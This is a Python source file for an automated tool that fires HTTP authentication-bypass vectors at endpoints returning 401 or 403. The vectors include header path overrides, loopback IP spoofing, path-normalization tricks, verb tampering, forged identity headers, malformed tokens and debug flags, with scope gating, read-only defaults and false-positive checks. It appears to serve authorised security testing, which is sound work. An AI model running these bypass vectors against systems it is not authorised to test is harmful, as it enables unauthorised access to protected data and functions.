#!/usr/bin/env python3
"""
run.py -- auth-bypass-battery entry point.

Fires every HTTP-level authentication-bypass CLASS against every endpoint that
denied us with 401/403, and keeps going until each endpoint's vector set is
EXHAUSTED (or the per-endpoint budget cap is reached). This is the capability
behind "authentication bypass exhaustion": the other access-control skills
(idor-bola-access-control, privilege-matrix-mapping) need an identity to compare
against, and waf-evasion-mastery answers a different question (a WAF blocking a
payload, not an authenticator refusing a route). Nothing else enumerated the
unauthenticated-bypass surface, so a 403 was treated as a dead end instead of a
hypothesis.

BYPASS CLASSES
--------------
1. ``header_path_override``   -- request a permissive path, name the protected
                                 one in X-Original-URL / X-Rewrite-URL / ...
2. ``ip_allowlist_spoof``     -- loopback in X-Forwarded-For / X-Real-IP / ...
3. ``path_normalization``     -- ``//p``, ``/p/.``, ``/p/..;/``, ``/.;/p``,
                                 ``%2f``, case-flip, extension suffixes
4. ``verb_tampering``         -- alternate/nonstandard verbs + method-override
                                 headers
5. ``identity_header_injection`` -- X-Forwarded-User / X-Remote-User / X-Role ...
6. ``malformed_auth_header``  -- empty/null/undefined bearer + empty session
7. ``origin_referer_trust``   -- self-referential Referer/Origin, XHR marker
8. ``content_negotiation``    -- Accept/Content-Type and format/debug query flags

SAFETY MODEL
------------
* Read-only by default. Every vector uses GET/HEAD/OPTIONS or a nonstandard verb
  the server cannot act on. Mutating verbs (POST/PUT/PATCH/DELETE) are generated
  ONLY under ``config.allow_mutating`` (an explicit mutation budget), and are
  tagged ``mutating: true`` in the artifact.
* Bounded by construction -- the vector set is finite and enumerated, never a
  loop or a flood. ``max_requests_per_endpoint`` caps it further, and hitting the
  cap is reported as ``vectors_exhausted: false`` rather than silently trimmed.
* Scope-gated on every URL actually requested (base URL *and* each variant).
* Custody: response bodies are offloaded to ``evidence_spill_id``; only hashes
  and byte counts are inlined.

ZERO-FALSE-POSITIVE DISCRIMINATOR
---------------------------------
A status change is not a bypass. Four independent controls must all fail to
explain the response before it is called ``confirmed``:

1. the unmodified baseline really returned 401/403 (else ``not_protected``);
2. the body is not the host's soft-404 page (probed per host);
3. the body is not the baseline denial body behind a different status;
4. **attribution** -- the same URL requested *without* the bypass headers must
   not already produce that body. Without this, ``header_path_override`` (which
   requests the permissive root) would report the public homepage as a bypass
   every single time. When the plain request to a normalization variant of the
   protected path is itself open, that is reported separately and honestly as
   ``unprotected_variant`` (suspected, for the Oracle) rather than credited to
   the technique.

CONTRACT
--------
* Input  : {"endpoints": [{"url","method","status"}] | "endpoints_spill_id": "...",
            "privilege_matrix_spill_id": "...", "scope_policy_spill_id": "...",
            "base_headers": {...}, "config": {...}}
* Output : one strict JSON artifact on stdout (references/ARTIFACT_SCHEMA.md).
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import os
import re
import sys
import time
from collections.abc import Callable, Iterable, Sequence
from dataclasses import dataclass, field
from datetime import UTC, datetime
from typing import Any
from urllib.parse import urlsplit, urlunsplit

try:
    import httpx  # type: ignore
except ImportError:  # pragma: no cover
    httpx = None

try:
    from spill_store import read_spill, write_spill
except ImportError:  # pragma: no cover
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from spill_store import read_spill, write_spill  # type: ignore

SAFE_METHODS = frozenset({"GET", "HEAD", "OPTIONS"})
MUTATING_METHODS = frozenset({"POST", "PUT", "PATCH", "DELETE"})
DENIAL_STATUSES = frozenset({401, 403})
# A route/method that simply does not exist is not a bypass -- the variant is missing.
ABSENT_STATUSES = frozenset({404, 405, 501})

REQ_TIMEOUT = float(os.environ.get("AUTHBYPASS_TIMEOUT", "15"))
CONCURRENCY = int(os.environ.get("AUTHBYPASS_CONCURRENCY", "6"))
DEFAULT_MAX_REQUESTS = int(os.environ.get("AUTHBYPASS_MAX_REQ", "200"))

SKILL_NAME = "auth-bypass-battery"
SKILL_VERSION = "1.0"
SKILL_PHASE = "5"


# --------------------------------------------------------------------- helpers
def _now_iso() -> str:
    return datetime.now(UTC).isoformat()


def _host_of(url: str) -> str:
    try:
        return (urlsplit(url).hostname or "").lower()
    except ValueError:
        return ""


_VOLATILE = (
    (re.compile(
        r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?"), "<TS>"),
    (re.compile(r"(?i)(csrf|xsrf|authenticity)[-_]?token[\"'\s:=>]{1,6}[\w.\-+/=]+"),
     r"\1=<CSRF>"),
    (re.compile(r"\bnonce[\"'\s:=>]{1,6}[\w.\-+/=]+", re.I), "nonce=<N>"),
)


def _normalize(text: str) -> str:
    """Strip volatile fields so a hash match means same *content*, not same instant."""
    if not text:
        return ""
    out = text
    for pattern, repl in _VOLATILE:
        out = pattern.sub(repl, out)
    return out


def _hash(text: str) -> str:
    return hashlib.sha256(_normalize(text).encode("utf-8", "replace")).hexdigest()[:16]


class ScopePolicy:
    """Deny-by-default host allowlist, mirroring the other Phase 5 batteries."""

    def __init__(self, policy: dict | None, hosts: Sequence[str]):
        self.raw = policy or {}
        self.have_policy = policy is not None
        self.in_scope = [self._c(p) for p in self.raw.get("in_scope", [])]
        self.out_scope = [self._c(p) for p in self.raw.get("out_of_scope", [])]
        if not self.in_scope:
            for h in hosts:
                if h:
                    self.in_scope += [self._c(h), self._c(f"*.{h}")]

    @staticmethod
    def _c(pattern: str) -> re.Pattern[str]:
        p = pattern.strip().lower().rstrip(".")
        if p.startswith("*."):
            return re.compile(rf"^([a-z0-9_-]+\.)*{re.escape(p[2:])}$")
        return re.compile(rf"^{re.escape(p)}$")

    def allowed(self, host: str) -> bool:
        h = (host or "").strip().lower()
        if not h:
            return False
        if any(rx.match(h) for rx in self.out_scope):
            return False
        return any(rx.match(h) for rx in self.in_scope)


# ---------------------------------------------------------------------- vectors
@dataclass(slots=True)
class Vector:
    """One concrete bypass attempt: a URL, a verb, and the headers that carry it.

    ``same_resource`` records whether the variant still targets the protected
    path. It drives attribution: a vector that instead requests a permissive
    carrier path (the ``header_path_override`` class asks for ``/`` and names the
    real path in a header) must not have that carrier's own public content
    mistaken for the protected resource.
    """

    name: str
    url: str
    method: str
    headers: dict[str, str] = field(default_factory=dict)
    mutating: bool = False
    same_resource: bool = True

    def dedup_key(self) -> tuple[str, str, tuple[tuple[str, str], ...]]:
        """Identity of the wire request, so equivalent vectors are not sent twice."""
        return (self.method.upper(), self.url, tuple(sorted(self.headers.items())))


@dataclass(slots=True)
class Ctx:
    """Everything a vector generator needs about one protected endpoint."""

    url: str
    method: str
    path: str
    root: str
    query: str


def _ctx_of(url: str, method: str) -> Ctx:
    parts = urlsplit(url)
    root = urlunsplit((parts.scheme, parts.netloc, "", "", ""))
    return Ctx(url=url, method=(method or "GET").upper(),
               path=parts.path or "/", root=root, query=parts.query)


def _rebuild(ctx: Ctx, path: str, query: str | None = None) -> str:
    parts = urlsplit(ctx.url)
    return urlunsplit((parts.scheme, parts.netloc, path,
                       ctx.query if query is None else query, ""))


# -- class 1: header path override (request a permissive path, name the real one)
_OVERRIDE_HEADERS = (
    "X-Original-URL", "X-Original-Path", "X-Rewrite-URL",
    "X-Override-URL", "X-Original-URI", "X-Rewrite-Path",
)


def _cls_header_path_override(ctx: Ctx) -> Iterable[Vector]:
    for header in _OVERRIDE_HEADERS:
        yield Vector(f"header_path_override:{header}", ctx.root + "/", "GET",
                     {header: ctx.path}, same_resource=False)
        # Same trick keeping the real verb, which some routers honour per-method.
        if ctx.method != "GET":
            yield Vector(f"header_path_override:{header}+{ctx.method}", ctx.root + "/",
                         ctx.method, {header: ctx.path}, same_resource=False)


# -- class 2: IP allowlist spoofing (loopback / self in a forwarding header)
_IP_HEADERS = (
    "X-Forwarded-For", "X-Real-IP", "X-Client-IP", "X-Originating-IP",
    "X-Remote-IP", "X-Remote-Addr", "X-Host", "X-Forwarded-Host", "X-Client",
)
_LOOPBACK_VALUES = ("127.0.0.1", "::1", "localhost")


def _cls_ip_allowlist_spoof(ctx: Ctx) -> Iterable[Vector]:
    for header in _IP_HEADERS:
        for value in _LOOPBACK_VALUES:
            yield Vector(f"ip_allowlist_spoof:{header}={value}", ctx.url, "GET",
                         {header: value})


# -- class 3: path normalization / traversal to a differently-routed match
def _path_variants(path: str) -> dict[str, str]:
    base = (path or "/").rstrip("/") or "/"
    bare = base.lstrip("/")
    variants = {
        "double_slash": f"//{bare}",
        "trailing_slash": f"{base}/",
        "dot_segment": f"{base}/.",
        "dot_slash": f"{base}/./",
        "semicolon_traversal": f"{base}/..;/",
        "leading_semicolon": f"/.;{base}",
        "trailing_semicolon": f"{base}..;/",
        "encoded_slash": f"{base}%2f",
        "trailing_space": f"{base}%20",
        "case_flip": base.swapcase(),
        "json_ext": f"{base}.json",
        "html_ext": f"{base}.html",
        "trailing_dot": f"{base}.",
    }
    # A variant identical to the original teaches us nothing; drop it.
    return {k: v for k, v in variants.items() if v != base}


def _cls_path_normalization(ctx: Ctx) -> Iterable[Vector]:
    for label, variant in _path_variants(ctx.path).items():
        yield Vector(f"path_normalization:{label}", _rebuild(ctx, variant), "GET")


# -- class 4: verb tampering + method override
_OVERRIDE_METHOD_HEADERS = (
    "X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method", "X-Original-Method",
)
# Verbs a router will not have a handler for: the server cannot act on them, so
# probing them is non-mutating even though they are not in SAFE_METHODS.
_NONSTANDARD_VERBS = ("FOO", "BAR", "JEFF", "TRACE")


def _cls_verb_tampering(ctx: Ctx, allow_mutating: bool) -> Iterable[Vector]:
    for verb in ("HEAD", "OPTIONS", *_NONSTANDARD_VERBS):
        yield Vector(f"verb_tampering:{verb}", ctx.url, verb)
    for header in _OVERRIDE_METHOD_HEADERS:
        for verb in ("GET", "POST"):
            if verb == "POST" and not allow_mutating:
                continue
            yield Vector(f"verb_tampering:{header}={verb}", ctx.url, "GET",
                         {header: verb}, mutating=(verb == "POST"))
    if allow_mutating:
        for verb in sorted(MUTATING_METHODS - {ctx.method}):
            yield Vector(f"verb_tampering:{verb}", ctx.url, verb, mutating=True)


# -- class 5: identity asserted by header (trusted-proxy confusion)
_IDENTITY_HEADERS = (
    "X-Forwarded-User", "X-Forwarded-Email", "X-Remote-User", "X-Auth-User",
    "X-Original-User", "X-Username", "X-User", "X-Authenticated-User",
    "X-Forwarded-For-User",
)
_IDENTITY_VALUES = ("admin", "root", "administrator")
_BOOLEAN_ADMIN_HEADERS = ("X-Admin", "X-Is-Admin", "X-Is-User", "X-Role")


def _cls_identity_header_injection(ctx: Ctx) -> Iterable[Vector]:
    for header in _IDENTITY_HEADERS:
        for value in _IDENTITY_VALUES:
            yield Vector(f"identity_header_injection:{header}={value}", ctx.url, "GET",
                         {header: value})
    for header in _BOOLEAN_ADMIN_HEADERS:
        for value in ("admin", "true"):
            yield Vector(f"identity_header_injection:{header}={value}", ctx.url, "GET",
                         {header: value})


# -- class 6: malformed / null credential presented as if authenticated
_MALFORMED_AUTH = (
    "Bearer ", "Basic ", "Bearer", "Bearer null", "Bearer undefined",
    "Bearer .", "Negotiate", "",
)
_EMPTY_CREDENTIAL_HEADERS = ("Cookie", "X-Api-Key", "X-Access-Token", "X-Auth-Token")


def _cls_malformed_auth_header(ctx: Ctx) -> Iterable[Vector]:
    for value in _MALFORMED_AUTH:
        yield Vector(f"malformed_auth_header:Authorization={value!r}", ctx.url, "GET",
                     {"Authorization": value})
    for header in _EMPTY_CREDENTIAL_HEADERS:
        value = "session=" if header == "Cookie" else ""
        yield Vector(f"malformed_auth_header:{header}=empty", ctx.url, "GET",
                     {header: value})


# -- class 7: origin / referer trust and XHR markers
def _cls_origin_referer_trust(ctx: Ctx) -> Iterable[Vector]:
    yield Vector("origin_referer_trust:Referer=root", ctx.url, "GET",
                 {"Referer": ctx.root + "/"})
    yield Vector("origin_referer_trust:Referer=self", ctx.url, "GET", {"Referer": ctx.url})
    yield Vector("origin_referer_trust:Origin=root", ctx.url, "GET", {"Origin": ctx.root})
    yield Vector("origin_referer_trust:XHR", ctx.url, "GET",
                 {"X-Requested-With": "XMLHttpRequest"})
    yield Vector("origin_referer_trust:Referer+Origin", ctx.url, "GET",
                 {"Referer": ctx.root + "/", "Origin": ctx.root})


# -- class 8: content negotiation and framework debug/format flags
_DEBUG_QUERY_FLAGS = ("format=json", "_format=json", "debug=true", "_debug=1", "json=1")


def _cls_content_negotiation(ctx: Ctx) -> Iterable[Vector]:
    yield Vector("content_negotiation:Accept=any", ctx.url, "GET", {"Accept": "*/*"})
    yield Vector("content_negotiation:Accept=json", ctx.url, "GET",
                 {"Accept": "application/json"})
    yield Vector("content_negotiation:Content-Type=json", ctx.url, "GET",
                 {"Content-Type": "application/json"})
    yield Vector("content_negotiation:Content-Type=text", ctx.url, "GET",
                 {"Content-Type": "text/plain"})
    for flag in _DEBUG_QUERY_FLAGS:
        joined = f"{ctx.query}&{flag}" if ctx.query else flag
        yield Vector(f"content_negotiation:?{flag}", _rebuild(ctx, ctx.path, joined), "GET")


# Class registry: the authoritative, finite vector set. "Exhausted" means every
# class below ran against the endpoint, so adding a class extends the contract.
BYPASS_CLASSES: dict[str, Callable[..., Iterable[Vector]]] = {
    "header_path_override": lambda ctx, allow_mutating: _cls_header_path_override(ctx),
    "ip_allowlist_spoof": lambda ctx, allow_mutating: _cls_ip_allowlist_spoof(ctx),
    "path_normalization": lambda ctx, allow_mutating: _cls_path_normalization(ctx),
    "verb_tampering": _cls_verb_tampering,
    "identity_header_injection":
        lambda ctx, allow_mutating: _cls_identity_header_injection(ctx),
    "malformed_auth_header": lambda ctx, allow_mutating: _cls_malformed_auth_header(ctx),
    "origin_referer_trust": lambda ctx, allow_mutating: _cls_origin_referer_trust(ctx),
    "content_negotiation": lambda ctx, allow_mutating: _cls_content_negotiation(ctx),
}


def build_vectors(ctx: Ctx, *, allow_mutating: bool = False) -> list[Vector]:
    """Enumerate every bypass vector for one endpoint, de-duplicated by wire identity."""
    seen: set[tuple[str, str, tuple[tuple[str, str], ...]]] = set()
    out: list[Vector] = []
    for generator in BYPASS_CLASSES.values():
        for vector in generator(ctx, allow_mutating):
            if not allow_mutating and (vector.mutating
                                       or vector.method.upper() in MUTATING_METHODS):
                continue  # read-only posture: never emit a mutating verb
            key = vector.dedup_key()
            if key in seen:
                continue
            seen.add(key)
            out.append(vector)
    return out


# ------------------------------------------------------------------- classifier
def classify_variant(
    status: int,
    body: str,
    baseline_hash: str,
    control_hash: str,
    plain: tuple[int, str] | None = None,
    *,
    same_resource: bool = True,
) -> str:
    """Map one variant response onto a bypass verdict.

    ``plain`` is ``(status, body_hash)`` for the same URL requested WITHOUT the
    bypass headers, or ``None`` when the variant URL is the endpoint URL (so the
    baseline already is the plain control). ``same_resource`` says whether the
    variant still targets the protected path.

    The controls are what keep this zero-false-positive: a 2xx is only credited to
    the technique when nothing more mundane explains it.
    """
    if status in DENIAL_STATUSES:
        return "denied"
    if status in ABSENT_STATUSES:
        return "absent"
    body_hash = _hash(body)
    if control_hash and body_hash == control_hash:
        return "absent"                      # soft-404: served the not-found page
    if 300 <= status < 400:
        return "likely"                      # redirected: worth an Oracle look
    if not 200 <= status < 300:
        return "other"
    if not (body or "").strip():
        return "likely"                      # real status change, no content to prove it
    if body_hash == baseline_hash:
        return "denied"                      # same refusal content behind a new status
    if plain is not None and body_hash == plain[1]:
        # The header/verb changed nothing -- this is the carrier URL's own content.
        # A normalization variant of the protected path that is itself open is still
        # a real access-control inconsistency, so it is reported, but as suspected
        # and attributed to the route rather than to the technique.
        return "unprotected_variant" if same_resource else "ineffective"
    return "confirmed"


# ---------------------------------------------------------------------- battery
class AuthBypassBattery:
    """Exhaustively fires the bypass classes at every 401/403 endpoint."""

    def __init__(
        self,
        endpoints: Sequence[dict[str, Any]],
        scope_policy_spill_id: str | None = None,
        base_headers: dict[str, str] | None = None,
        config: dict[str, Any] | None = None,
        transport: Any | None = None,
    ) -> None:
        self.endpoints = [e for e in endpoints if isinstance(e, dict) and e.get("url")]
        self.config = config or {}
        self.allow_mutating = bool(self.config.get("allow_mutating", False))
        self.max_requests = int(
            self.config.get("max_requests_per_endpoint", DEFAULT_MAX_REQUESTS))
        self.base_headers = dict(base_headers or {})
        self.transport = transport
        self.errors: list[dict[str, str]] = []
        self.results: list[dict[str, Any]] = []
        self.requests_sent = 0
        # url -> (status, body_hash) for that url requested with no bypass headers.
        self._plain_controls: dict[str, tuple[int, str]] = {}
        hosts = list({_host_of(str(e.get("url", ""))) for e in self.endpoints})
        policy = None
        if scope_policy_spill_id:
            try:
                policy = read_spill(scope_policy_spill_id)
            except Exception as exc:  # noqa: BLE001
                self.errors.append({"stage": "scope_load", "error": str(exc)})
        self.scope = ScopePolicy(policy, hosts)

    # -- transport -----------------------------------------------------------
    def _client(self) -> Any:
        kwargs: dict[str, Any] = {"follow_redirects": False, "timeout": REQ_TIMEOUT}
        if self.transport is not None:
            kwargs["transport"] = self.transport
        return httpx.AsyncClient(**kwargs)

    async def _request(
        self, client: Any, method: str, url: str, headers: dict[str, str],
    ) -> tuple[int, str, dict[str, str]] | None:
        self.requests_sent += 1
        try:
            response = await client.request(method, url, headers=headers)
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "request", "url": url, "error": str(exc)})
            return None
        try:
            body = response.text
        except Exception:  # noqa: BLE001
            body = ""
        return response.status_code, body, dict(response.headers)

    async def _plain_control(self, client: Any, url: str) -> tuple[int, str]:
        """Lazily learn what ``url`` returns with NO bypass headers (attribution control)."""
        cached = self._plain_controls.get(url)
        if cached is not None:
            return cached
        outcome = await self._request(client, "GET", url, dict(self.base_headers))
        plain = (outcome[0], _hash(outcome[1])) if outcome else (0, "")
        self._plain_controls[url] = plain
        return plain

    # -- one endpoint --------------------------------------------------------
    async def test_endpoint(self, client: Any, endpoint: dict[str, Any]) -> dict[str, Any]:
        url = str(endpoint.get("url"))
        method = str(endpoint.get("method") or "GET").upper()
        record: dict[str, Any] = {
            "endpoint": url, "method": method, "baseline_status": None,
            "vectors_total": 0, "vectors_attempted": 0, "vectors_exhausted": False,
            "class_results": {}, "confirmed": 0, "likely": 0, "skipped": None,
            "hits": [],
        }

        if not self.scope.allowed(_host_of(url)):
            record["skipped"] = "out_of_scope"
            return record

        # Baseline: prove the endpoint really denies us before calling anything a bypass.
        baseline = await self._request(client, method, url, dict(self.base_headers))
        if baseline is None:
            record["skipped"] = "baseline_error"
            return record
        record["baseline_status"] = baseline[0]
        baseline_hash = _hash(baseline[1])
        if baseline[0] not in DENIAL_STATUSES:
            record["skipped"] = "not_protected"   # 200/302/404: no auth wall to bypass
            return record

        # Soft-404 control for this host, so a 200 serving the not-found page is not a hit.
        control_hash = await self._soft404_control(client, url)

        vectors = build_vectors(_ctx_of(url, method), allow_mutating=self.allow_mutating)
        record["vectors_total"] = len(vectors)
        attempted = vectors[:self.max_requests]
        record["vectors_attempted"] = len(attempted)
        # Exhaustion is claimed only when the whole enumerated set actually ran.
        record["vectors_exhausted"] = len(attempted) == len(vectors)

        semaphore = asyncio.Semaphore(max(1, CONCURRENCY))
        counts: dict[str, int] = {}
        hits: list[dict[str, Any]] = []
        lock = asyncio.Lock()

        async def fire(vector: Vector) -> None:
            if not self.scope.allowed(_host_of(vector.url)):
                async with lock:
                    counts["out_of_scope"] = counts.get("out_of_scope", 0) + 1
                return
            headers = {**self.base_headers, **vector.headers}
            async with semaphore:
                outcome = await self._request(client, vector.method, vector.url, headers)
                if outcome is None:
                    verdict, status, body, resp_headers = "error", 0, "", {}
                else:
                    status, body, resp_headers = outcome
                    # Attribution control: only worth a request for a candidate hit.
                    plain = None
                    if vector.url != url and status not in DENIAL_STATUSES \
                            and status not in ABSENT_STATUSES:
                        plain = await self._plain_control(client, vector.url)
                    verdict = classify_variant(
                        status, body, baseline_hash, control_hash, plain,
                        same_resource=vector.same_resource)
            if verdict not in ("confirmed", "likely", "unprotected_variant"):
                async with lock:
                    counts[verdict] = counts.get(verdict, 0) + 1
                return
            evidence_id = ""
            try:
                evidence_id = write_spill({
                    "endpoint": url, "vector": vector.name, "method": vector.method,
                    "url_requested": vector.url, "sent_headers": vector.headers,
                    "status": status, "body": body[:65_536],
                    "response_headers": resp_headers, "observed_at": _now_iso(),
                })
            except Exception as exc:  # noqa: BLE001
                self.errors.append({"stage": "evidence_spill", "error": str(exc)})
            confidence = "confirmed" if verdict == "confirmed" else "suspected"
            async with lock:
                counts[verdict] = counts.get(verdict, 0) + 1
                hits.append({
                    "endpoint": url, "vector": vector.name,
                    "bypass_class": vector.name.split(":", 1)[0],
                    "method": vector.method, "url_requested": vector.url,
                    "sent_headers": vector.headers, "mutating": vector.mutating,
                    "status": status, "verdict": verdict, "confidence": confidence,
                    "mechanism": ("bypass_technique" if verdict == "confirmed"
                                  else "unprotected_variant_url"),
                    "body_hash": _hash(body), "body_bytes": len(body or ""),
                    "baseline_status": record["baseline_status"],
                    "evidence_spill_id": evidence_id,
                })

        await asyncio.gather(*(fire(v) for v in attempted))
        record["class_results"] = counts
        record["confirmed"] = sum(1 for h in hits if h["verdict"] == "confirmed")
        record["likely"] = sum(1 for h in hits if h["verdict"] != "confirmed")
        record["hits"] = hits
        return record

    async def _soft404_control(self, client: Any, url: str) -> str:
        """Learn the host's not-found body so a soft-404 cannot masquerade as a bypass."""
        parts = urlsplit(url)
        probe = urlunsplit((parts.scheme, parts.netloc,
                            f"/.authbypass-control-{int(time.time() * 1000)}", "", ""))
        if not self.scope.allowed(_host_of(probe)):
            return ""
        outcome = await self._request(client, "GET", probe, dict(self.base_headers))
        return _hash(outcome[1]) if outcome else ""

    # -- whole run -----------------------------------------------------------
    async def run(self) -> dict[str, Any]:
        if httpx is None:
            return _error_artifact("httpx not installed")
        if not self.endpoints:
            return _error_artifact("no endpoints supplied")

        async with self._client() as client:
            # Sequential per endpoint: keeps attribution controls race-free and the
            # request rate bounded; concurrency is applied within an endpoint.
            self.results = [await self.test_endpoint(client, ep) for ep in self.endpoints]

        findings = [h for r in self.results for h in r.get("hits", [])]
        confirmed = [f for f in findings if f["verdict"] == "confirmed"]
        protected = [r for r in self.results if r.get("baseline_status") in DENIAL_STATUSES]

        if not protected:
            status = "no_protected_endpoints"
        elif confirmed:
            status = "bypass_confirmed"
        else:
            status = "exhausted_no_bypass"

        return {
            "findings": findings,
            "endpoints": self.results,
            "meta": {
                "skill": SKILL_NAME, "version": SKILL_VERSION, "phase": SKILL_PHASE,
                "status": status, "generated_at": _now_iso(),
                "endpoints_supplied": len(self.endpoints),
                "endpoints_protected": len(protected),
                "vectors_total": sum(r.get("vectors_total", 0) for r in self.results),
                "vectors_attempted": sum(r.get("vectors_attempted", 0) for r in self.results),
                "requests_sent": self.requests_sent,
                # Honest exhaustion: every protected endpoint ran its complete set.
                "all_vectors_exhausted": bool(protected) and all(
                    r.get("vectors_exhausted") for r in protected),
                "bypass_classes": sorted(BYPASS_CLASSES),
                "confirmed_findings": len(confirmed),
                "suspected_findings": len(findings) - len(confirmed),
                "safety": {
                    "read_only": not self.allow_mutating,
                    "mutating_allowed": self.allow_mutating,
                    "bounded_vectors": True,
                    "max_requests_per_endpoint": self.max_requests,
                    "scope_gated": True,
                    "soft_404_discriminator": True,
                    "baseline_denial_required": True,
                    "attribution_control": True,
                },
            },
            "scope_summary": {
                "policy_present": self.scope.have_policy,
                "hosts_in_scope": sorted({_host_of(str(e.get("url", "")))
                                          for e in self.endpoints}),
            },
            "errors": self.errors,
        }


# ----------------------------------------------------------------- input/output
def _select_protected_from_matrix(matrix: Any) -> list[dict[str, Any]]:
    """Derive 401/403 endpoints from a privilege-matrix artifact (alternate input)."""
    rows = matrix
    if isinstance(matrix, dict):
        rows = matrix.get("matrix") or matrix.get("matrix_inline") or []
        inner = matrix.get("matrix_spill_id")
        if inner and not rows:
            try:
                rows = read_spill(str(inner))
            except Exception:  # noqa: BLE001
                rows = []
    if isinstance(rows, dict):
        rows = rows.get("matrix", [])
    out: list[dict[str, Any]] = []
    for row in rows if isinstance(rows, list) else []:
        if not isinstance(row, dict):
            continue
        access = row.get("access_map") or {}
        unauth = access.get("unauthenticated") or {}
        if str(unauth.get("verdict", "")).lower() == "denied":
            out.append({"url": row.get("endpoint"), "method": row.get("method") or "GET"})
    return [e for e in out if e.get("url")]


def _load_endpoints(payload: dict[str, Any]) -> list[dict[str, Any]]:
    """Resolve the endpoint set from inline list, spill id, or privilege matrix."""
    raw: Any = payload.get("endpoints")
    if not raw and payload.get("endpoints_spill_id"):
        try:
            raw = read_spill(str(payload["endpoints_spill_id"]))
        except Exception:  # noqa: BLE001
            raw = None
    if isinstance(raw, dict):
        raw = raw.get("endpoints", [])
    if isinstance(raw, list) and raw:
        return [e for e in raw if isinstance(e, dict) and e.get("url")]
    if payload.get("privilege_matrix_spill_id"):
        try:
            matrix = read_spill(str(payload["privilege_matrix_spill_id"]))
        except Exception:  # noqa: BLE001
            return []
        return _select_protected_from_matrix(matrix)
    return []


def _load_input(argv: Sequence[str]) -> dict[str, Any]:
    raw = ""
    if len(argv) > 1 and argv[1].strip():
        raw = argv[1]
    elif not sys.stdin.isatty():
        raw = sys.stdin.read()
    raw = raw.strip()
    if not raw:
        raise ValueError('no input: expected JSON {"endpoints":[...]} or '
                         '{"privilege_matrix_spill_id":"..."}')
    obj = json.loads(raw)
    if not isinstance(obj, dict):
        raise ValueError("input must be a JSON object")
    return obj


def _error_artifact(message: str) -> dict[str, Any]:
    return {
        "findings": [],
        "endpoints": [],
        "meta": {"skill": SKILL_NAME, "version": SKILL_VERSION, "phase": SKILL_PHASE,
                 "status": "error", "generated_at": _now_iso()},
        "scope_summary": {"policy_present": False},
        "errors": [{"stage": "init", "error": message}],
    }


async def _amain(argv: Sequence[str]) -> int:
    try:
        payload = _load_input(argv)
    except Exception as exc:  # noqa: BLE001
        print(json.dumps(_error_artifact(f"input error: {exc}")))
        return 2
    endpoints = _load_endpoints(payload)
    if not endpoints:
        print(json.dumps(_error_artifact(
            "need 'endpoints'/'endpoints_spill_id' or a 'privilege_matrix_spill_id' "
            "containing denied endpoints")))
        return 2
    battery = AuthBypassBattery(
        endpoints,
        scope_policy_spill_id=payload.get("scope_policy_spill_id"),
        base_headers=payload.get("base_headers"),
        config=payload.get("config"),
    )
    artifact = await battery.run()
    print(json.dumps(artifact, ensure_ascii=False))
    return 0


def main() -> int:
    return asyncio.run(_amain(sys.argv))


if __name__ == "__main__":
    raise SystemExit(main())
